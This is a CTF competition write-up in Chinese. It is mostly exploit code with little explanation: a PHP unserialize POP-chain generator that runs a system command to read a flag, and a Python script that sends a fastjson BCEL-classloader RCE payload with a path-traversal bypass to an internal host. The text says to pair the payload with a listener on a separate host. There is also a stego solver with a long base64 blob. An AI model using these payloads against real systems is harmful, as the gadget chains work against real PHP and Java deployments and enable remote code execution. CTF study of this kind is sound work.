# 祥云杯-WriteUp

> 原文: https://www.ctfiot.com/1349.html
> ID: 1349

在10.10.1.12开个监听 9999 端口，然后拿以下 exp 打内网 fastjson

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
https://xz.aliyun.com/t/9948#toc-6
<?php
namespace CodeceptionExtension{
    use FakerDefaultGenerator;
    use GuzzleHttpPsr7AppendStream;
    class  RunProcess{
        protected $output;
        private $processes = [];
        public function __construct(){
            $this->processes[]=new DefaultGenerator(new AppendStream());
            $this->output=new DefaultGenerator('jiang');
        }
    }
    echo base64_encode(serialize(new RunProcess()));
}
namespace Faker{
    class DefaultGenerator
    {
        protected $default;
        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}
namespace GuzzleHttpPsr7{
    use FakerDefaultGenerator;
    final class AppendStream{
        private $streams = [];
        private $seekable = true;
        public function __construct(){
            $this->streams[]=new CachingStream();
        }
    }
    final class CachingStream{
        private $remoteStream;
        public function __construct(){
            $this->remoteStream=new DefaultGenerator(false);
            $this->stream=new  PumpStream();
        }
    }
    final class PumpStream{
        private $source;
        private $size=-10;
        private $buffer;
        public function __construct(){
            $this->buffer=new DefaultGenerator('j');
            include("closure/autoload.php");
            $a = function(){system('cat /flag.txt');};
            $a = OpisClosureserialize($a);
            $b = unserialize($a);
            $this->source=$b;
        }
    }
}
```



```
import requests
bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeRMo$d3$40$Q$7d$eb$d8$b1c$5c$d2$ba$94$8fBK$gHq$5c$88$v$aa$90h$x$$$I$$M$B$e1$K$Uq$e9z$bb$a4$$$89c9$9b$d2$D$ff$87sA$C$84$E$3f$80$l$85$98$b5P$L$d4$b6fwg$de$cc$7b$9e$d9$9f$bf$be$fd$A$b0$86$V$X$k$$$3b$b8R$c39$cc$db$b8$ea$e0$9a$83$F$X$8b$b8$aeM$c3$c6$92$8b$g$9a6n$d8$b8$c9P$R$c3$3d$G$bf$7b$c0$Py4$e0Y$3f$8aU$91f$fd$N$86$eaf$9a$a5$ea$na$82$f6K$G$f3$d1hO2$d4$bbi$s$9fN$86$89$yvx2$m$8f$b3$v$G$7f$90S$b1$e2$e2$ed6$cf$cb$Qq1$b8$f1hR$I$f9$q$d5$d0$9a$3cL$H$j$cd$e5$a1$8ei$86$db$ef$faR5$f6$95$ca$d7$a3h$f5nG$7f$9d$d5$7b$eb$P$e8$89v$FW$8d$e8M$f8$3e$e1cy$7fm$d7$c3$U$ce3L$ff$af$95$eaFI$9aE$E$dbg0$ee$I$h$z$P$cb$b8$e5$n$40$9ba$f64$e1$f1$91$90$b9JG$99$87P$f3$9bZ$d0$3f$r$9f$r$HR$u$86$99S$d7$8bI$a6$d2$n$c9wI$ec$c9a$$hw$cf$606t$c9$p$v$Y$82$e0$f5$d9$a6$fe$9d$f1$bc$Y$J9$kSF$3d$a7$a0$w$5b$b7Sp$n$b1D$c3$f3h$9e$c4$a8$7f$99v$G$ed$a9adg$e8$b4$40$x$a3$d5$K$bf$80$j$97$40$9fl$b5t$d2$400$7b$C$cda$96$de$V$df$f8$84J$f5$3b$cc$5e$c5$b7$e2$9e$e9W$e3$9e$f5$R$95x$eb$x$ec$f03$9cW$l$e0l$d1$c6$3d$a6$E$LM$b4$e8$9e$Ye$e1E$d8$a5$G$8b$dey$a2iR$a4E$bee$a2$KI$e3$F$8a$da0h$e0s$9a$edb$J$be$f4$h$f9$c1h$ad$95$C$A$A"

burp0_url = "http://10.10.1.11:8080/xxxx/..;/admin/test"
burp0_headers = {"Cache-Control": "max-age=0", "DNT": "1", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Accept": "application/json", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close", "Content-Type": "application/json"}
burp0_data = "{rn    {rn        "@type": "com.alibaba.fastjson.JSONObject",rn        "x":{rn                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",rn                "driverClassLoader": {rn                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"rn                },rn                "driverClassName": ""+bcel+""rn        }rn    }: "x",rn"a":""+"a"*20000+""rn}"
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```



```
#!/usr/bin/python
# -*- coding: utf-8 -*-
from Crypto.Util.number import long_to_bytes
from PIL import Image
text=''
for num in range(0,129488):
    im = Image.open('%d.png'%num)
    #print(im.size[1])#26 #29
    if(im.size[1]==26):
        text += '0'
    else:
        text += '1'
cipher = int(text, 2)
print(long_to_bytes(cipher))

#b'data:image/png;base64,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